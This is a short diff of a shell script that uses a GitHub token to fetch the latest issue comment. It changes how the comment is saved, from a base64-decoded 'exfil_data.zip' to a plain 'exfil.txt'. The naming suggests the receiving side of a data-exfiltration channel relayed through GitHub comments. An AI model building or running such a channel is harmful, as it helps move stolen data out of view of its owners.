@@ -10,8 +10,8 @@ COMMENT_BODY=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
   "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$ISSUE_NUM/comments" \
   | jq -r '.[-1].body')
 
-echo "Latest comment retrieved, decoding..."
-echo "$COMMENT_BODY" | base64 -d > exfil_data.zip
+echo "Latest comment retrieved, saving to exfil.txt..."
+echo "$COMMENT_BODY" > exfil.txt
 
-echo "Zip file created"
-ls -lh exfil_data.zip
+echo "File created"
+ls -lh exfil.txt
